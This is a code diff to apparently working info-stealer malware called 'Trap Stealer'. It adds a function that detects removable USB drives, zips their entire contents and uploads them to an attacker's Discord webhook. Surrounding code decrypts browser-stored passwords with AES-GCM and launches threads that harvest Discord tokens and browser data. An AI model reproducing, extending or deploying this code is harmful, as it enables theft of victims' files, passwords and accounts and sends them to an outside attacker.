@@ -17,6 +17,7 @@ from json import loads, dumps, load, dump
 from pathlib import Path
 from locale import windows_locale
 from importlib import import_module
+
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
@@ -30,6 +31,7 @@ crasher = '%Crash%'
 hidewindow = '%Hide%'
 changebio = '%ChangeBio%'
 biotext = '%Text%'
+Drive = '%Drive%'
 
 # WEBSITE UPLOAD 
 
@@ -291,17 +293,69 @@ def fakegen():
         print(f"An error occurred: {e}")
 
 
-def DecryptValue(buff, master_key=None):
-        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+def DecryptValue(Buffer, master_key=None):
+        starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
         if starts == 'v10' or starts == 'v11':
-            iv = buff[3:15]
-            payload = buff[15:]
+            iv = Buffer[3:15]
+            payload = Buffer[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16]
             try: decrypted_pass = decrypted_pass.decode()
             except:pass
             return decrypted_pass
+
+def steal_driver():
+    
+    drive_detected = False
+    while not drive_detected:
+        try:
+            out = subprocess.check_output('wmic logicaldisk get DriveType, caption', shell=True)
+            drives = str(out, 'utf-8').strip().split('\r\r\n')
+
+            for drive in drives:
+                if '2' in drive:
+                    drive_detected = True
+                    drive_letter = drive.split(':')[0]
+                    drive_type = drive.split(':')[1].strip()
+                    zip_name = f'{drive_letter}_Drive.zip'
+                    temp_dir = os.path.join(os.environ['TEMP'], 'DriveCompression')
+                    os.makedirs(temp_dir, exist_ok=True)
+                    zip_path = os.path.join(temp_dir, zip_name)
+                    with ZipFile(zip_path, 'w') as zipf:
+                        for foldername, subfolders, filenames in os.walk(f'{drive_letter}:\\'):
+                            for filename in filenames:
+                                file_path = os.path.join(foldername, filename)
+                                zipf.write(file_path, arcname=os.path.relpath(file_path, f'{drive_letter}:\\'))
+                                
+                    upload = upload_file(zip_path)
+                    
+                    data = {
+                
+                "username": "Trap Stealer",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": "🍪 Trap Stealer USB Drivers",
+                        "description": f"Browser Drivers Files\n{upload}",
+                        "color": 0xffb6c1,
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
+                    }
+                ]
+            }
+                    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        except:
+            pass
+                
+                
+
+
 
 def check_python_or_convert(file_path):
     _, file_extension = os.path.splitext(file_path)
@@ -1631,11 +1685,11 @@ Passw = []
 def getPassw(path, arg):
 
     try:
-        def DecryptValue(buff, master_key=None):
-            starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+        def DecryptValue(Buffer, master_key=None):
+            starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
             if starts == 'v10' or starts == 'v11':
-                iv = buff[3:15]
-                payload = buff[15:]
+                iv = Buffer[3:15]
+                payload = Buffer[15:]
                 cipher = AES.new(master_key, AES.MODE_GCM, iv)
                 decrypted_pass = cipher.decrypt(payload)
                 decrypted_pass = decrypted_pass[:-16]
@@ -3068,6 +3122,12 @@ def gatha():
             hide_console2()
         except:
             pass
+        
+    if Drive == True:
+        Drives = threading.Thread(target=steal_driver)
+        Drives.start()
+        Second_Thread.append(Drives)
+        
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
@@ -3108,8 +3168,7 @@ def gatha():
         us = threading.Thread(target=fakegen)
         us.start()
         First_Thread.append(us)
-    else:
-        pass
+
     if FakeWebhook == True:
         wb = threading.Thread(target=webhook_tools)
         wb.start()
@@ -3134,8 +3193,7 @@ def gatha():
         sta = threading.Thread(target=startup)
         sta.start()
         First_Thread.append(sta)
-    else:
-        pass
+
 
     gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     gatz.start()
@@ -3166,18 +3224,16 @@ def gatha():
             NoDiscord = False
         except:
             pass
-    else:pass
+
     
-    try:
-        if NoDiscord == True:
+    if NoDiscord == True:
+        try:
             no = threading.Thread(target=NoDiscord)
             no.start()
             First_Thread.append(no)
             injection = False
-        else:
+        except:
             pass
-    except:
-        pass
     
     for patt in discordPaths:
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
